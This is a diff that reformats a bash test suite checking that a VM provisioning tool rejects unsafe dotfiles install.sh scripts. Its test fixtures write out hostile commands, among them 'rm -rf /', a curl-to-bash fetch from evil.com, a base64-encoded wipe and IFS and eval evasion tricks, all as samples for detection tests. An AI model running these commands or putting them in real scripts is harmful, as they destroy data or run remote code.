@@ -104,7 +104,7 @@ validate_install_sh_safe() {
     # CVE-2: install.sh content inspection (CVSS 9.0)
     # SEC-002: Expanded patterns to prevent evasion (CVSS 7.5)
     if [ ! -f "$install_script" ]; then
-        return 0  # Already handled by validate_install_sh_exists
+        return 0 # Already handled by validate_install_sh_exists
     fi
 
     # Check for dangerous commands
@@ -157,7 +157,7 @@ validate_install_sh_safe() {
     )
 
     for pattern in "${dangerous_patterns[@]}"; do
-        if grep -qE "$pattern" "$install_script" 2>/dev/null; then
+        if grep -qE "$pattern" "$install_script" 2> /dev/null; then
             echo "ERROR: Dangerous pattern detected in install.sh: $pattern"
             return 1
         fi
@@ -204,7 +204,7 @@ validate_git_repository() {
     # BUG-006: Git repository validation
     if [ -d "$path/.git" ]; then
         # Verify it's a valid git repo
-        if ! git -C "$path" rev-parse --git-dir >/dev/null 2>&1; then
+        if ! git -C "$path" rev-parse --git-dir > /dev/null 2>&1; then
             echo "ERROR: Invalid git repository"
             return 1
         fi
@@ -227,7 +227,7 @@ test_flag_parsing_no_flag() {
     # This would be tested by running provision-vm.sh without flag
     # and checking that DOTFILES_LOCAL_PATH is not set
     # For now, we mark this as a placeholder
-    result="pass"  # Will fail until implemented
+    result="pass" # Will fail until implemented
 
     test_result "Default behavior without --test-dotfiles flag" "pass" "$result"
 }
@@ -291,9 +291,9 @@ test_flag_parsing_multiple_flags() {
     output=$("$SCRIPT_DIR/../provision-vm.sh" --test-dotfiles "$TEST_DOTFILES_DIR" custom-vm 2048 4 2>&1 || true)
 
     # Verify behavior: VM name, memory, and vcpus are still parsed correctly
-    if echo "$output" | grep -q "VM Name: custom-vm" && \
-       echo "$output" | grep -q "Memory: 2048MB" && \
-       echo "$output" | grep -q "vCPUs: 4"; then
+    if echo "$output" | grep -q "VM Name: custom-vm" &&
+        echo "$output" | grep -q "Memory: 2048MB" &&
+        echo "$output" | grep -q "vCPUs: 4"; then
         result="pass"
     fi
 
@@ -444,7 +444,7 @@ test_security_install_sh_dangerous_commands() {
 
     # Test: CVE-2 - install.sh content inspection (CVSS 9.0)
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 rm -rf /
 EOF
@@ -460,7 +460,7 @@ test_security_install_sh_curl_pipe_bash() {
 
     # Test: CVE-2 - Detect curl | bash pattern
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 curl https://evil.com/script.sh | bash
 EOF
@@ -476,7 +476,7 @@ test_security_install_sh_safe_content() {
 
     # Test: CVE-2 - Safe install.sh should pass
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "Installing dotfiles..."
 ln -sf ~/.dotfiles/.zshrc ~/.zshrc
@@ -493,7 +493,7 @@ test_security_pattern_evasion_variable_expansion() {
 
     # Test: SEC-002 - Pattern evasion via variable expansion
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 CMD="rm -rf"
 TARGET="/"
@@ -511,7 +511,7 @@ test_security_pattern_evasion_base64() {
 
     # Test: SEC-002 - Pattern evasion via base64 encoding
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "cm0gLXJmIC8K" | base64 -d | bash
 EOF
@@ -527,7 +527,7 @@ test_security_pattern_evasion_whitespace_ifs() {
 
     # Test: SEC-002 - Pattern evasion via IFS whitespace trick
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 rm${IFS}-rf${IFS}/
 EOF
@@ -543,7 +543,7 @@ test_security_pattern_evasion_eval() {
 
     # Test: SEC-002 - Eval command should be detected
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 eval "rm -rf /tmp/evil"
 EOF
@@ -559,7 +559,7 @@ test_security_pattern_evasion_sudo() {
 
     # Test: SEC-002 - Sudo privilege escalation should be detected
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 sudo chown root:root /etc/passwd
 EOF
@@ -804,9 +804,9 @@ test_security_toctou_symlink_replacement_prevention() {
         fi
 
         # Get canonical path WITHOUT following symlinks
-        if command -v realpath >/dev/null 2>&1; then
+        if command -v realpath > /dev/null 2>&1; then
             local canonical_path
-            canonical_path=$(realpath --no-symlinks "$path" 2>/dev/null)
+            canonical_path=$(realpath --no-symlinks "$path" 2> /dev/null)
             if [ "$canonical_path" != "$path" ]; then
                 echo "ERROR: Path contains symlink component"
                 return 1
@@ -836,7 +836,7 @@ test_security_git_shallow_clone_playbook() {
     # Verify Ansible playbook has depth: 1 parameter
     local result="fail"
 
-    if grep -q "depth: 1" "$SCRIPT_DIR/../ansible/playbook.yml" 2>/dev/null; then
+    if grep -q "depth: 1" "$SCRIPT_DIR/../ansible/playbook.yml" 2> /dev/null; then
         result="pass"
     fi
 
@@ -851,7 +851,7 @@ test_security_git_shallow_clone_both_sources() {
 
     # Check that the Clone dotfiles repository task has depth: 1
     # Need -A10 because there are comment lines and yaml structure before depth
-    if grep -A10 "Clone dotfiles repository" "$playbook" 2>/dev/null | grep -q "depth: 1"; then
+    if grep -A10 "Clone dotfiles repository" "$playbook" 2> /dev/null | grep -q "depth: 1"; then
         result="pass"
     fi
 
@@ -898,10 +898,10 @@ test_security_nested_symlink_in_dotfiles() {
 
     # Simulate find command for symlink detection
     local found_symlinks
-    found_symlinks=$(find "$TEST_DOTFILES_DIR" -type l 2>/dev/null)
+    found_symlinks=$(find "$TEST_DOTFILES_DIR" -type l 2> /dev/null)
 
     if [ -n "$found_symlinks" ]; then
-        result="fail"  # Found symlinks (should be rejected)
+        result="fail" # Found symlinks (should be rejected)
     else
         result="pass"
     fi
@@ -916,7 +916,7 @@ test_security_whitelist_safe_commands() {
 
     # Test: SEC-006 - Whitelist validation allows safe commands (CVSS 5.0)
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 # Safe dotfiles installation script
 echo "Installing dotfiles..."
@@ -951,7 +951,7 @@ test_security_whitelist_detects_python() {
 
     # Test: SEC-006 - Whitelist detects non-whitelisted command (python)
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "Installing dotfiles..."
 python3 -m pip install some-package
@@ -966,7 +966,7 @@ EOF
         [[ -z "$line" ]] && continue
 
         if ! [[ "$line" =~ $safe_pattern ]]; then
-            result="fail"  # Unsafe command detected (expected)
+            result="fail" # Unsafe command detected (expected)
             break
         fi
     done < "$TEST_DOTFILES_DIR/install.sh"
@@ -981,7 +981,7 @@ test_security_whitelist_interactive_prompt() {
 
     # Test: SEC-006 - Whitelist triggers interactive prompt for unsafe commands
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 npm install
 EOF
@@ -1015,7 +1015,7 @@ test_git_repo_validation_valid() {
 
     # Test: BUG-006 - Valid git repository
     mkdir -p "$TEST_DOTFILES_DIR"
-    (cd "$TEST_DOTFILES_DIR" && git init) >/dev/null 2>&1
+    (cd "$TEST_DOTFILES_DIR" && git init) > /dev/null 2>&1
 
     validate_git_repository "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
     test_result "BUG-006: Valid git repository should pass" "pass" "$result"
@@ -1097,11 +1097,11 @@ test_install_sh_world_writable() {
 
     # Test: SEC-005 - World-writable install.sh should be rejected (CVSS 4.0)
     mkdir -p "$TEST_DOTFILES_DIR"
-    cat > "$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "test"
 EOF
-    chmod 666 "$TEST_DOTFILES_DIR/install.sh"  # rw-rw-rw-
+    chmod 666 "$TEST_DOTFILES_DIR/install.sh" # rw-rw-rw-
 
     local result="fail"
     export TEST_MODE=1
@@ -1128,14 +1128,14 @@ test_install_sh_group_writable() {
     # Test: SEC-005 - Group-writable install.sh should be rejected
     mkdir -p "$TEST_DOTFILES_DIR"
     touch "$TEST_DOTFILES_DIR/install.sh"
-    chmod 664 "$TEST_DOTFILES_DIR/install.sh"  # rw-rw-r--
+    chmod 664 "$TEST_DOTFILES_DIR/install.sh" # rw-rw-r--
 
     # Simulate permission check (group-writable bit 020)
     local perms="664"
     local group_writable=$((8#$perms & 8#020))
 
     if [ "$group_writable" -ne 0 ]; then
-        result="fail"  # Group-writable detected (should be rejected)
+        result="fail" # Group-writable detected (should be rejected)
     else
         result="pass"
     fi
@@ -1182,8 +1182,8 @@ test_terraform_variable_empty_default() {
     # Check that terraform/main.tf has correct default
     local result="fail"
 
-    if grep -q 'variable "dotfiles_local_path"' "$SCRIPT_DIR/../terraform/main.tf" 2>/dev/null && \
-       grep -q 'default.*=.*""' "$SCRIPT_DIR/../terraform/main.tf" 2>/dev/null; then
+    if grep -q 'variable "dotfiles_local_path"' "$SCRIPT_DIR/../terraform/main.tf" 2> /dev/null &&
+        grep -q 'default.*=.*""' "$SCRIPT_DIR/../terraform/main.tf" 2> /dev/null; then
         result="pass"
     fi
 
@@ -1201,7 +1201,7 @@ test_ansible_inventory_with_local_path() {
     # Check that inventory.tpl has conditional dotfiles_local_path
     local result="fail"
 
-    if grep -q 'dotfiles_local_path="${dotfiles_local_path}"' "$SCRIPT_DIR/../terraform/inventory.tpl" 2>/dev/null; then
+    if grep -q 'dotfiles_local_path="${dotfiles_local_path}"' "$SCRIPT_DIR/../terraform/inventory.tpl" 2> /dev/null; then
         result="pass"
     fi
 
@@ -1213,7 +1213,7 @@ test_ansible_inventory_without_local_path() {
     # Check that inventory.tpl has conditional check
     local result="fail"
 
-    if grep -q 'if dotfiles_local_path != ""' "$SCRIPT_DIR/../terraform/inventory.tpl" 2>/dev/null; then
+    if grep -q 'if dotfiles_local_path != ""' "$SCRIPT_DIR/../terraform/inventory.tpl" 2> /dev/null; then
         result="pass"
     fi
 
@@ -1230,7 +1230,7 @@ test_ansible_playbook_uses_local_repo() {
     # Test: Ansible playbook should use file:// URL when dotfiles_local_path is set
     local result="fail"
 
-    if grep -q 'file://{{ dotfiles_local_path }}' "$SCRIPT_DIR/../ansible/playbook.yml" 2>/dev/null; then
+    if grep -q 'file://{{ dotfiles_local_path }}' "$SCRIPT_DIR/../ansible/playbook.yml" 2> /dev/null; then
         result="pass"
     fi
 
@@ -1241,7 +1241,7 @@ test_ansible_playbook_uses_github_default() {
     # Test: Ansible playbook should use GitHub URL when dotfiles_local_path is not set
     local result="fail"
 
-    if grep -q '{{ dotfiles_repo }}' "$SCRIPT_DIR/../ansible/playbook.yml" 2>/dev/null; then
+    if grep -q '{{ dotfiles_repo }}' "$SCRIPT_DIR/../ansible/playbook.yml" 2> /dev/null; then
         result="pass"
     fi
 
@@ -1253,7 +1253,7 @@ test_ansible_whitespace_handling() {
     # Check that Jinja2 template properly quotes the variable
     local result="fail"
 
-    if grep -q 'file://{{ dotfiles_local_path }}' "$SCRIPT_DIR/../ansible/playbook.yml" 2>/dev/null; then
+    if grep -q 'file://{{ dotfiles_local_path }}' "$SCRIPT_DIR/../ansible/playbook.yml" 2> /dev/null; then
         # Jinja2 templates handle variables correctly, including spaces
         result="pass"
     fi
@@ -1271,7 +1271,7 @@ test_e2e_full_pipeline() {
     # Create minimal test dotfiles
     local test_dotfiles_dir="/tmp/test-dotfiles-$$"
     mkdir -p "$test_dotfiles_dir"
-    cat > "$test_dotfiles_dir/install.sh" <<'EOF'
+    cat > "$test_dotfiles_dir/install.sh" << 'EOF'
 #!/bin/bash
 # Safe dotfiles installation
 echo "Installing dotfiles..."
@@ -1288,9 +1288,9 @@ EOF
     set -e
 
     # Validate full pipeline would work
-    if [ $exit_code -eq 0 ] && \
-       echo "$output" | grep -q "DRY RUN" && \
-       echo "$output" | grep -q "Dotfiles: $test_dotfiles_dir (local)"; then
+    if [ $exit_code -eq 0 ] &&
+        echo "$output" | grep -q "DRY RUN" &&
+        echo "$output" | grep -q "Dotfiles: $test_dotfiles_dir (local)"; then
         result="pass"
     fi
 
@@ -1310,9 +1310,9 @@ test_e2e_dry_run_with_default_dotfiles() {
     set -e
 
     # Should complete validation with GitHub default
-    if [ $exit_code -eq 0 ] && \
-       echo "$output" | grep -q "DRY RUN" && \
-       echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
+    if [ $exit_code -eq 0 ] &&
+        echo "$output" | grep -q "DRY RUN" &&
+        echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
         result="pass"
     fi
 
